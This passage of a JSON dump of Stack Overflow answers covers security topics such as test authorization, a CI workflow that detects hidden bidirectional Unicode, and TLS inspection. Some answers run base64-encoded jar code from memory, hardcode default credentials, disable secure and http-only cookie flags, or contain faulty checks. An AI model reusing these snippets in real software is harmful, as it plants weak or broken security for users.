        "author": "Mark"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72401154/how-to-disable-preauthorize-for-tests",
    "title": "how to disable @PreAuthorize for tests?",
    "question_id": 72401154,
    "posted_date": "2022-05-27T02:11:02",
    "answers": [
      {
        "answer_id": 72401738,
        "body": "import org.springframework.security.test.context.support.WithMockUser;\nimport org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;\nimport static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;\n@WithMockUser\n@AutoConfigureMockMvc\n@SpringBootTest\nclass MyTest {\n    @Autowired\n    private MockMvc mvc;\n    @Test\n    void fooTest() {\n      mvc.perform(get(\"path\")).andExpect(status().isOk())\n    }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-05-27T03:12:25",
        "author": "Gannebal Barka"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72256214/how-to-get-the-risk-score-output-in-github-action-when-scanning-with-kubescape",
    "title": "How to get the &quot;risk-score&quot; output in github action when scanning with kubescape?",
    "question_id": 72256214,
    "posted_date": "2022-05-16T04:29:09",
    "answers": [
      {
        "answer_id": 74521307,
        "body": "name: Kubescape scanning for misconfigurations\non: [push, pull_request]\njobs:\n  kubescape:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v3\n    - uses: kubescape/github-action@main\n      with:\n        format: sarif\n        outputFile: results.sarif\n        # # Optional: Specify the Kubescape cloud account ID\n        # account: ${{secrets.KUBESCAPE_ACCOUNT}}\n        # Fail when the risk-score is higher than X\n        failedThreshold: 25\n    - name: Upload Kubescape scan results to Github Code Scanning\n      uses: github/codeql-action/upload-sarif@v2\n      with:\n        sarif_file: results.sarif",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-11-21T10:33:35",
        "author": "David Wer"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/71218779/safe-way-of-implementing-single-iframe-for-html-files-with-script-src-data",
    "title": "Safe way of implementing single iframe for html files with script src=data:",
    "question_id": 71218779,
    "posted_date": "2022-02-22T04:27:49",
    "answers": [
      {
        "answer_id": 71293070,
        "body": "const token = TokenService.getToken();\n        var headers = [['Content-Security-Policy', 'script-src data:']];\n        if (token) {\n            headers.concat(['Authorization', token]);\n        }\n        const xhr = new XMLHttpRequest();\n        xhr.open('GET', this.fileUrl.toString().replace('./', document.baseURI))\n        xhr.responseType = 'document';\n        xhr.onreadystatechange = ev => {\n            if (xhr.readyState === xhr.DONE) {\n                if (xhr.status === 200) {\n                    var content = this.frameEl.nativeElement.contentWindow ||\n                        this.frameEl.nativeElement.contentDocument.document ||\n                        this.frameEl.nativeElement.contentDocument;\n                    content.document.open();\n                    content.document.write(xhr.response.documentElement.innerHTML);\n                    content.document.close();\n                } else {\n                    this.frameEl.nativeElement.attr('srcdoc', '<html><head></head><body>Error loading data.</body></html>');\n                }\n            }\n        }\n        headers.forEach(function (header) {\n            xhr.setRequestHeader(header[0], header[1]);\n        });\n        xhr.send();",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2022-02-28T04:43:48",
        "author": "Kaa"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69968043/how-to-update-github-actions-ci-to-detect-trojan-code-commits-malicious-bidire",
    "title": "How to update GitHub Actions CI to detect Trojan Code commits (malicious [bidirectional] unicode chars, python)",
    "question_id": 69968043,
    "posted_date": "2021-11-14T18:33:25",
    "answers": [
      {
        "answer_id": 70086236,
        "body": "################################################################################\n# File:    .github/workflows/unicode_warn.yml\n# Version: 0.1\n# Purpose: Detects Unicode in PRs and comments the results of findings in PR\n#           * https://tech.michaelaltfield.net/bidi-unicode-github-defense/\n# Authors: Michael Altfield <michael@michaelaltfield.net>\n# Created: 2021-11-20\n# Updated: 2021-11-20\n################################################################################\nname: malicious_sanity_checks\n\n# execute this workflow automatically on all PRs\non: [pull_request]\n\njobs:\n\n  unicode_warn:\n\n    runs-on: ubuntu-latest\n    container: debian:bullseye-slim\n\n    steps:\n\n    - name: Prereqs\n      env:\n        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      run: |\n        apt-get update\n        apt-get install -y git bsdmainutils\n        git clone \"https://token:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}.git\" .\n      shell: bash\n\n    - name: Check diff for unicode\n      id: unicode_diff\n      run: |\n        set -x\n        diff=`git diff --unified=0 ${{ github.event.pull_request.base.sha }} ${{ github.event.pull_request.head.sha }} | grep -E \"^[+]\" | grep -Ev '^(--- a/|\\+\\+\\+ b/)'`\n        unicode_diff=`echo -n \"${diff}\" | grep -oP \"[^\\x00-\\x7F]*\"`\n        unicode_grep_exit_code=$?\n        echo \"${unicode_diff}\"\n\n        unicode_diff_hexdump=`echo -n \"${unicode_diff}\" | hd`\n        echo \"${unicode_diff_hexdump}\"\n\n        # did we select any unicode characters?\n        if [[ \"${unicode_diff_hexdump}\" == \"\" ]]; then\n          # we didn't find any unicode characters\n          human_result=\"INFO: No unicode characters found in PR's commits\"\n          echo \"${human_result}\"\n\n        else\n          # we found at least 1 unicode character\n          human_result=\"^^ WARNING: Unicode characters found in diff!\"\n          echo \"${human_result}\"\n          echo \"${diff}\"\n\n        fi\n\n        echo \"UNICODE_HUMAN_RESULT=${human_result}\" >> $GITHUB_ENV\n\n      shell: bash {0}\n\n    # leave a comment on the PR. See also\n    #  * https://stackoverflow.com/a/64126737\n    # make sure this doesn't open command injection risks\n    #  * https://github.com/victoriadrake/github-guestbook/issues/1#issuecomment-657121754\n    - name: Leave comment on PR\n      uses: actions/github-script@v5\n      with:\n        github-token: ${{secrets.GITHUB_TOKEN}}\n        script: |\n          github.rest.issues.createComment({\n            issue_number: context.issue.number,\n            owner: context.repo.owner,\n            repo: context.repo.repo,\n            body: \"${{ env.UNICODE_HUMAN_RESULT }}\"\n          })",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2021-11-23T13:43:16",
        "author": "Michael Altfield"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69766268/is-there-any-alternative-to-provide-user-and-password-to-hibernate-reactive-with",
    "title": "Is there any alternative to provide user and password to Hibernate reactive without persistance.xml?",
    "question_id": 69766268,
    "posted_date": "2021-10-29T05:06:31",
    "answers": [
      {
        "answer_id": 73940671,
        "body": "/**\n     * Create and return an EntityManagerFactory for the named persistence unit\n     * using the given properties.\n     *\n     * @param persistenceUnitName\n     *            the name of the persistence unit\n     * @param properties\n     *            Additional properties to use when creating the factory.\n     *            These properties may include properties to control\n     *            schema generation.  The values of these properties override\n     *            any values that may have been configured elsewhere.\n     * @return the factory that creates EntityManagers configured according to\n     *         the specified persistence unit.\n     */\n    public static EntityManagerFactory createEntityManagerFactory(String persistenceUnitName, Map properties) {",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-10-03T16:47:11",
        "author": "morpheus"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68939309/how-to-obtain-all-tls-sessions-from-sslcontext-using-ibmjsse2-default-provider",
    "title": "How to obtain all TLS sessions from SSLContext using IBMJSSE2 default provider?",
    "question_id": 68939309,
    "posted_date": "2021-08-26T09:20:39",
    "answers": [
      {
        "answer_id": 68941812,
        "body": "    private static String URL = \"https://www.google.com\";\n    private static String TRUST_STORE_FILE = \"/Users/xpto/trust.p12\";\n    private static String TRUST_STORE_PASS = \"truststore\";\n    private static String TRUST_STORE_TYPE = \"PKCS12\";\n    private static String TLS_VERSION = \"TLSv1.2\";\n    public static void main(String[] args) throws Exception {\n        KeyStore keyStore = KeyStore.getInstance(TRUST_STORE_TYPE);\n        keyStore.load(new FileInputStream(TRUST_STORE_FILE), TRUST_STORE_PASS.toCharArray());\n        SSLContext sslContext = SSLContexts\n                .custom()\n                .loadTrustMaterial(keyStore)\n                .useProtocol(TLS_VERSION)\n                .build();\n        HttpComponentsClientHttpRequestFactory clientFactory = new HttpComponentsClientHttpRequestFactory(HttpClients\n                .custom()\n                .setSSLSocketFactory(new SSLConnectionSocketFactory(sslContext))\n                .build());\n        RestTemplate restTemplate = new RestTemplate(clientFactory);\n        HttpHeaders requestHeaders = new HttpHeaders();\n        requestHeaders.setContentType(MediaType.APPLICATION_JSON);\n        requestHeaders.setAccept(Arrays.asList(MediaType.APPLICATION_JSON));\n        HttpEntity<String> requestEntity = new HttpEntity<String>(requestHeaders);\n        print(\"Requesting: \" + URL);\n        ResponseEntity<String> response = restTemplate.exchange(URL, HttpMethod.GET, requestEntity, String.class);\n        print(\"Response: \" + response.getBody());\n        printSSLContextInfo(sslContext);\n    }\n    private static void printSSLContextInfo(SSLContext sslContext) throws Exception {\n        print(\"-------------\\nPrinting TLS Client Information\");\n        SSLSessionContext sslSessionContext = sslContext.getClientSessionContext();\n        Enumeration<byte[]> sessionIds = sslSessionContext.getIds();\n        while (sessionIds.hasMoreElements()) {\n            SSLSession sslSession = sslSessionContext.getSession(sessionIds.nextElement());\n            print(\"Client: \" + sslSession.getPeerHost() + \":\" + sslSession.getPeerPort());\n            print(\"\\tProtocol: \" + sslSession.getProtocol());\n            print(\"\\tSessionID: \" + byteArrayToHex(sslSession.getId()));\n            print(\"\\tCipherSuite: \" + sslSession.getCipherSuite());\n            for (X509Certificate certificate : sslSession.getPeerCertificateChain()) {\n                print(\"\\tX509 Certificate: \" + certificate.getSubjectDN());\n                print(\"\\t\\tIssuer: \" + certificate.getIssuerDN().getName());\n                print(\"\\t\\tAlgorithm: \" + certificate.getSigAlgName());\n                print(\"\\t\\tValidity: \" + certificate.getNotAfter());\n            }\n        }\n    }\n    public static String byteArrayToHex(byte[] a) {\n        StringBuilder sb = new StringBuilder(a.length * 2);\n        for (byte b : a)\n            sb.append(String.format(\"%02x\", b));\n        return sb.toString();\n    }\n    public static void print(Object msg) {\n        System.out.println(msg);\n    }",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-08-26T11:56:41",
        "author": "Jo&#227;o Pedro Schmitt"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68718704/is-it-possible-to-call-a-firebase-function-for-a-secret-execute-some-code-and-t",
    "title": "Is it possible to call a Firebase function for a secret, execute some code and then call another function with the encrypted data?",
    "question_id": 68718704,
    "posted_date": "2021-08-09T17:25:13",
    "answers": [
      {
        "answer_id": 68719631,
        "body": "Single.create(sub -> {\n                doSomethingHere\n                sub.onSuccess(true);\n            }).subscribeOn(Schedulers.io())\n                    //.compose(bindToLifecycle())\n                    .observeOn(AndroidSchedulers.mainThread())\n                    .subscribe(new DisposableSingleObserver<Object>() {\n                        @Override\n                        public void onSuccess(Object o) {\n                          ExecuteTheNextThing();\n                        }\n                        @Override\n                        public void onError(Throwable e) {\n                          errorHandling\n                        }\n                    });\n        }",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-08-09T19:43:08",
        "author": "DIGI Byte"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68410748/run-jar-file-with-file-in-memory",
    "title": "Run jar file with file in memory",
    "question_id": 68410748,
    "posted_date": "2021-07-16T10:27:34",
    "answers": [
      {
        "answer_id": 68411933,
        "body": "package com.technojeeves.shm;\nimport com.technojeeves.io.IOUtils;\nimport java.util.Base64;\nimport java.util.zip.*;\nimport java.util.*;\nimport java.io.*;\nimport java.lang.reflect.Method;\npublic class Loader {\n    public static void main(String[] args) {\n         final String JARENC = \"UEsDBBQACAgIABqp8FIAAAAAAAAAAAAAAAAlAAQAY29tL3RlY2hub2plZXZlcy9zaG0vSGVsbG9Xb3JsZC5jbGFzc/7KAABtUMtOwkAUPZdXaa2CIPgkwsIEXNiNO4wbE+OCqAkGF65KmcCQtmPKgPGzdKGJCz/AjzLeaUzQhFncx5nzSO7X98cngFM0HGSQtZBzkUeBUJ76C98L/Xjs3QynItCEwpmMpT4nZNudgY0ibAuOizW4/+j955kWEbPUnEW1XvojlXebyFj3dSL8qFvEBsG9EmGomk8qCUctB2VsWqi4qGKLUF2hIliPZgtjtm33/iRqhsfdzsBCnXAYqMjTIpjEairEQsy82STy0qx7E0XIXaiRIJR6MhbX82gokjt/GDKSi3zJ5vX2wyp3gtNX8yQQl9KQS0vLE8NGCzW+oXkZkLki123eGtyJe/74HfTCA2GHayEFs7Cxi71f6lEqBexXWJX1N5SWdCf1zvPZjXA/TTn4AVBLBwhqV5QAMQEAAL8BAABQSwECFAAUAAgICAAaqfBSaleUADEBAAC/AQAAJQAEAAAAAAAAAAAAAAAAAAAAY29tL3RlY2hub2plZXZlcy9zaG0vSGVsbG9Xb3JsZC5jbGFzc/7KAABQSwUGAAAAAAEAAQBXAAAAiAEAAAAA\";\n        try {\n            Base64.Decoder dec = Base64.getDecoder();\n            byte[] jarBytes = dec.decode(JARENC);\n            RemoteClassLoader memJarLoader = new RemoteClassLoader(jarBytes);\n            Class<?> hw = memJarLoader.loadClass(\"com.technojeeves.shm.HelloWorld\", true);\n            Method main = hw.getMethod(\"main\", String[].class);\n            String[] params = null;\n            main.invoke(null, (Object)params);\n        } catch (Throwable t) {\n            t.printStackTrace();\n        }\n    }\n    static class RemoteClassLoader extends ClassLoader {\n        private final byte[] jarBytes;\n        private final Set<String> names;\n        public RemoteClassLoader(byte[] jarBytes) throws IOException {\n            this.jarBytes = jarBytes;\n            this.names = RemoteClassLoader.loadNames(jarBytes);\n        }\n        /**\n         * This will put all the entries into a thread-safe Set\n         */\n        private static Set<String> loadNames(byte[] jarBytes) throws IOException {\n            Set<String> set = new HashSet<>();\n            try (ZipInputStream jis = new ZipInputStream(new ByteArrayInputStream(jarBytes))) {\n                ZipEntry entry;\n                while ((entry = jis.getNextEntry()) != null) {\n                    set.add(entry.getName());\n                }\n            }\n            return Collections.unmodifiableSet(set);\n        }\n        @Override\n        public Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {\n            Class<?> clazz = findLoadedClass(name);\n            if (clazz == null) {\n                try {\n                    String toLoad = name.replace('.', '/') + \".class\";\n                    //System.out.printf(\"Attempting to load %s%n\", toLoad);\n                    InputStream in = getResourceAsStream(name.replace('.', '/') + \".class\");\n                    ByteArrayOutputStream out = new ByteArrayOutputStream();\n                    //StreamUtils.writeTo(in, out);\n                    IOUtils.copyStream(in, out);\n                    byte[] bytes = out.toByteArray();\n                    clazz = defineClass(name, bytes, 0, bytes.length);\n                    if (resolve) {\n                        resolveClass(clazz);\n                    }\n                } catch (Exception e) {\n                    clazz = super.loadClass(name, resolve);\n                }\n            }\n            return clazz;\n        }\n        @Override\n        public InputStream getResourceAsStream(String name) {\n            // Check first if the entry name is known\n            if (!names.contains(name)) {\n                return null;\n            }\n            // I moved the JarInputStream declaration outside the\n            // try-with-resources statement as it must not be closed otherwise\n            // the returned InputStream won't be readable as already closed\n            boolean found = false;\n            ZipInputStream jis = null;\n            try {\n                jis = new ZipInputStream(new ByteArrayInputStream(jarBytes));\n                ZipEntry entry;\n                while ((entry = jis.getNextEntry()) != null) {\n                    if (entry.getName().equals(name)) {\n                        found = true;\n                        return jis;\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                // Only close the stream if the entry could not be found\n                if (jis != null && !found) {\n                    try {\n                        jis.close();\n                    } catch (IOException e) {\n                        // ignore me\n                    }\n                }\n            }\n            return null;\n        }\n    }\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2021-07-16T11:53:12",
        "author": "g00se"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/67801134/how-do-i-implement-a-minimal-access-control-for-a-private-web-app",
    "title": "How do I implement a minimal access control for a private Web App?",
    "question_id": 67801134,
    "posted_date": "2021-06-02T03:59:19",
    "answers": [
      {
        "answer_id": 67808518,
        "body": "#!/usr/bin/env python\nfrom bottle import route, run, request, redirect, response\nimport json\nimport os\nimport functools\nimport time\nsecret = os.urandom(32).hex()\nUSERNAME = \"admin\"\nPASSWORD = \"admin\"\nCOOKIE_NAME = \"session-cookie\"\nHTTPS = True\ndef verify_cookie() -> bool:\n    return request.get_cookie(COOKIE_NAME, secret=secret) == USERNAME\ndef verify_creds(username : str, password : str) -> bool:\n    return username == USERNAME and password == PASSWORD\ndef set_cookie(username : str):\n    in_ten_years_from_now = int(time.time()) + 10 * 365 * 24 * 60 * 60\n    response.set_cookie(COOKIE_NAME, username, secret=secret, expires = in_ten_years_from_now, secure=HTTPS, httponly=True)\ndef require_authorized(func):\n    @functools.wraps(func)\n    def wrapper(*args, **kwargs):\n        if not verify_cookie():\n            redirect(\"/login\")\n        return func(*args,**kwargs)\n    return wrapper\n@route('/', method='GET')\n@require_authorized\ndef index():\n    return f\"Welcome, {request.get_cookie(COOKIE_NAME, secret=secret)}\"\n@route('/login', method=['GET','POST'])\ndef login():\n    if request.method == 'GET':\n        return \"Welcome to the login page\"\n    else:\n        username,password = request.forms.get(\"username\"), request.forms.get(\"password\")\n        if verify_creds(username,password):\n            set_cookie(username)\n            redirect(\"/\")\n        else:\n            return \"Invalid creds, pls retry\"\nif __name__ == \"__main__\":\n    run(host='localhost', port=8080)",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2021-06-02T11:53:22",
        "author": "UziGoozie"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/67067621/divert-a-page-to-a-new-url-if-incorrect-url-parameter-is-manually-added-php",
    "title": "Divert A Page To A New URL If Incorrect URL Parameter is manually Added - PHP",
    "question_id": 67067621,
    "posted_date": "2021-04-12T21:36:52",
    "answers": [
      {
        "answer_id": 67110400,
        "body": "<?php\n    if (isset($_GET['id'])) {\n        $the_id = $_GET['id']; // I'd personally use filter_input here\n    } else {\n        // redirect to google if $_SERVER['HTTP_REFERER'] is not set\n        header(\"Location: \" . $_SERVER[\"HTTP_REFERER\"] ?? 'http://google.com');\n        exit;\n    }\n    // assuming you already have the $connection object available here\n    $stmt = $connection->prepare(\"SELECT * FROM users WHERE ID = ?\");\n    $stmt->bind_param('i', $the_id); // note that this is the safe way to pass user input to a SQL query to avoid SQL injection\n    $stmt->execute();\n    $stmt->store_result(); // required to use \"num_rows\" below\n    if ($stmt->num_rows === 0) {\n        // no user record was found with the given ID\n        // redirect to google if $_SERVER['HTTP_REFERER'] is not set\n        header(\"Location: \" . $_SERVER[\"HTTP_REFERER\"] ?? 'http://google.com');\n        exit;\n    }\n    // at this point you're sure that a user with id $the_id exists, so you can continue your code flow as expected :-)",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-04-15T10:29:17",
        "author": "Fl&#225;vio Heleno"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/66998812/spring-security-httpsecurity-with-keycloak-setup",
    "title": "Spring security (HttpSecurity) with keycloak setup",
    "question_id": 66998812,
    "posted_date": "2021-04-08T03:00:06",
    "answers": [
      {
        "answer_id": 68941004,
        "body": "import org.springframework.security.oauth2.provider.token.TokenStore;\n    import org.springframework.security.oauth2.provider.token.store.jwk.JwkTokenStore;\n    @KeycloakConfiguration\n    @Configuration\n    @EnableWebSecurity\n    @ComponentScan(\n        basePackageClasses = KeycloakSecurityComponents.class\n    )\n    @EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled = true, jsr250Enabled = true)\n    public class SecurityConfig extends KeycloakWebSecurityConfigurerAdapter {\n        @Bean\n        public TokenStore tokenStore() {\n            return new JwkTokenStore(\"http://localhost:8080/auth/realms/master/protocol/openid-connect/certs\");\n        }\n    }",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-08-26T11:01:54",
        "author": "Mohammed soharab"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/66653699/site-wide-failed-login-requests-threshold-dynamic-formula",
    "title": "Site wide failed login requests threshold dynamic formula",
    "question_id": 66653699,
    "posted_date": "2021-03-16T06:49:17",
    "answers": [
      {
        "answer_id": 66703617,
        "body": "$loginAmountStats = $this->requestTrackRepository->getLoginAmountStats();\n// Calc integer amount from given percentage and total login\n$allowedFailureAmount = $loginAmountStats['login_total'] / 100 * $this->settings['login_failure_percentage'];\nif ($loginAmountStats['login_failures'] > $allowedFailureAmount) {\n    // If changed, update SecurityServiceTest distributed brute force test expected error message\n    $msg = 'Maximum amount of tolerated requests reached site-wide.';\n    throw new SecurityException('captcha', SecurityException::GLOBAL_LOGIN, $msg);\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2021-03-19T02:43:38",
        "author": "Samuel Gfeller"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/66176581/spring-mvc-sessionregistry-returns-empty-list-of-principals",
    "title": "Spring mvc sessionRegistry returns empty list of principals",
    "question_id": 66176581,
    "posted_date": "2021-02-12T12:42:17",
    "answers": [
      {
        "answer_id": 66179069,
        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\txmlns=\"http://java.sun.com/xml/ns/javaee\"\n\txsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\"\n\tversion=\"3.0\">\n\t<display-name>loyfeey</display-name>\n\t<context-param>\n\t\t<param-name>contextConfigLocation</param-name>\n\t\t<param-value>/WEB-INF/spring-context.xml</param-value>\n\t</context-param>\n\t<!-- <context-param> <param-name>contextConfigLocation</param-name> <param-value>com.mkyong.web.config</param-value>\n\t\t</context-param> -->\n\t<listener>\n\t\t<listener-class>\n\t\t\torg.springframework.security.web.session.HttpSessionEventPublisher</listener-class>\n\t</listener>\n\t<listener>\n\t\t<listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n\t</listener>\n\t<servlet>\n\t\t<servlet-name>spring</servlet-name>\n\t\t<servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n\t\t<init-param>\n\t\t\t<param-name>contextConfigLocation</param-name>\n        <param-value>/WEB-INF/spring-servlet.xml</param-value>\n\t\t</init-param>\n\t\t<load-on-startup>1</load-on-startup>\n\t</servlet>\n\t<servlet-mapping>\n\t\t<servlet-name>spring</servlet-name>\n\t\t<url-pattern>/</url-pattern>\n\t</servlet-mapping>\n\t<filter>\n\t\t<filter-name>encodingFilter</filter-name>\n\t\t<filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\n\t\t<init-param>\n\t\t\t<param-name>encoding</param-name>\n\t\t\t<param-value>UTF-8</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>forceEncoding</param-name>\n\t\t\t<param-value>true</param-value>\n\t\t</init-param>\n\t</filter>\n\t<filter-mapping>\n\t\t<filter-name>encodingFilter</filter-name>\n\t\t<url-pattern>/*</url-pattern>\n\t</filter-mapping>\n\t<error-page>\n\t\t<location>/errors</location>\n\t</error-page>\n\t<session-config>\n\t\t<session-timeout>30</session-timeout>\n\t\t<cookie-config>\n\t\t\t<!-- if true then browser script won't be able to access the cookie -->\n\t\t\t<http-only>false</http-only>\n\t\t\t<!--!if true then the cookie will be sent only over HTTPS connection -->\n\t\t\t<secure>false</secure>\n\t\t</cookie-config>\n\t\t<tracking-mode>COOKIE</tracking-mode>\n\t</session-config>\n</web-app>",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2021-02-12T16:11:05",
        "author": "Amine ABBAOUI"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/66094729/nestjs-api-accept-calls-only-from-https",
    "title": "Nestjs API accept calls only from https",
    "question_id": 66094729,
    "posted_date": "2021-02-07T20:06:20",
    "answers": [
      {
        "answer_id": 66095877,
        "body": "const express = require(\"express\");\nconst app = express();\napp.use((req, res, next) => {\n    let userAgent = req.get(\"User-Agent\").toLowerCase();\n    let isWget = Boolean(userAgent.indexOf(\"wget\"));\n    let isCURL = Boolean(userAgent.indexOf(\"curl\"));\n    let isPostman = Boolean(userAgent.indexOf(\"postman\"));\n    if (isWget || isCURL || isPostman) {\n        res.sendStatus(404);\n        return next();\n    }\n    res.redirect(`https://${req.headers.host + req.url}`);\n    return next();\n})\napp.listen(port, () => {\n    console.log(\"Listening!\");\n})",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-02-07T23:21:52",
        "author": "Marcos Dionisio"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65718853/quarkus-security-jpa-with-multiple-persistence-unit",
    "title": "Quarkus Security JPA with multiple persistence unit",
    "question_id": 65718853,
    "posted_date": "2021-01-14T07:21:03",
    "answers": [
      {
        "answer_id": 68011277,
        "body": "quarkus.datasource.db-kind=h2\nquarkus.hibernate-orm.datasource=security\nquarkus.hibernate-orm.packages=eventmgr.entity.security\nquarkus.datasource.security.db-kind=h2\nquarkus.datasource.security.jdbc.url=jdbc:h2:mem:security;\nquarkus.flyway.security.migrate-at-start=true\nquarkus.flyway.security.locations=db/security\nquarkus.hibernate-orm.\"summary\".datasource=summary\nquarkus.hibernate-orm.\"summary\".packages=eventmgr.entity.summary\nquarkus.datasource.summary.jdbc.url=jdbc:postgresql://localhost:5432/summary\nquarkus.datasource.summary.db-kind=postgresql\nquarkus.datasource.summary.username=postgres\nquarkus.datasource.summary.password=postgres\nquarkus.flyway.summary.migrate-at-start=true\nquarkus.flyway.summary.locations=db/migration\nquarkus.hibernate-orm.\"event\".datasource=event\nquarkus.hibernate-orm.\"event\".packages=eventmgr.entity.event\nquarkus.datasource.event.db-kind=postgresql\nquarkus.datasource.event.jdbc.url=jdbc:postgresql://localhost:5432/client\nquarkus.datasource.event.username=postgres\nquarkus.datasource.event.password=postgres",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-06-16T19:52:39",
        "author": "Sivelli"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65671145/how-to-decoding-aes-128-data-in-ios",
    "title": "How to Decoding AES-128 Data in iOS",
    "question_id": 65671145,
    "posted_date": "2021-01-11T11:50:43",
    "answers": [
      {
        "answer_id": 65671953,
        "body": "extern NSData * SecDecryptAES128CBCPad(NSData * data, NSData * key, NSData * iv) {\n    CCCryptorStatus    err;\n    NSMutableData *    result;\n    size_t              resultLength;\n    NSCParameterAssert(key.length == kCCKeySizeAES128);\n    NSCParameterAssert(iv.length == kCCBlockSizeAES128);\n    // Padding can expand the data, so we have to allocate space for that.  The rule for block\n    // cyphers, like AES, is that the padding only adds space on encryption (on decryption it\n    // can reduce space, obviously, but we don't need to account for that) and it will only add\n    // at most one block size worth of space.\n    result = [[NSMutableData alloc] initWithLength:[data length] + kCCBlockSizeAES128];\n    err = CCCrypt(\n        kCCDecrypt,\n        kCCAlgorithmAES128,\n        kCCOptionPKCS7Padding,\n        key.bytes, key.length,\n        iv.bytes,\n        data.bytes, data.length,\n        result.mutableBytes,  result.length,\n        &resultLength\n    );\n    assert(err == kCCSuccess);\n    // Set the output length to the value returned by CCCrypt.  This is necessary because\n    // we have padding enabled, meaning that we might have allocated more space than we needed.\n    [result setLength:resultLength];\n    return result;\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-01-11T12:43:58",
        "author": "\u0141ukasz \u0141abu\u0144ski"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65354660/dynamic-code-evaluation-unsafe-deserialization-on-serializationutils-clone",
    "title": "Dynamic Code Evaluation: Unsafe Deserialization on SerializationUtils.clone()",
    "question_id": 65354660,
    "posted_date": "2020-12-18T04:37:44",
    "answers": [
      {
        "answer_id": 65355276,
        "body": "import com.sun.xml.internal.ws.util.ByteArrayBuffer;\nimport org.apache.commons.io.serialization.ValidatingObjectInputStream;\nimport java.io.*;\npublic class Main {\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        Bar bar = new Bar(\"bar-test\");\n        Foo foo = new Foo(\"test-foo\", bar);\n        // write into an array buffer\n        ByteArrayBuffer buffer = new ByteArrayBuffer();\n        try (ObjectOutputStream serializeStream = new ObjectOutputStream(buffer)) {\n            serializeStream.writeObject(foo);\n        }\n        try (ValidatingObjectInputStream stream = new ValidatingObjectInputStream(buffer.newInputStream())) {\n            // add validated classes\n            stream.accept(Foo.class);\n            stream.accept(Bar.class);\n            Foo foo2 = (Foo) stream.readObject();\n            System.out.println(foo2);\n        }\n    }\n    public static class Foo implements Serializable {\n        private String name;\n        private Bar bar;\n        public Foo(String name, Bar bar) {\n            this.name = name;\n            this.bar = bar;\n        }\n        @Override\n        public String toString() {\n            return \"Foo{\" +\n                    \"name='\" + name + '\\'' +\n                    \", bar=\" + bar +\n                    '}';\n        }\n    }\n    public static class Bar implements Serializable {\n        private String name;\n        public Bar(String name) {\n            this.name = name;\n        }\n        @Override\n        public String toString() {\n            return \"Bar{\" +\n                    \"name='\" + name + '\\'' +\n                    '}';\n        }\n    }\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2020-12-18T05:21:51",
        "author": "Ismail Durmaz"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65224272/pysimplegui-ddosing-for-my-website-only-tool-not-working",
    "title": "PySimpleGUI ddosing (for my website only) tool not working",
    "question_id": 65224272,
    "posted_date": "2020-12-09T15:19:12",
    "answers": [
      {
        "answer_id": 65229449,
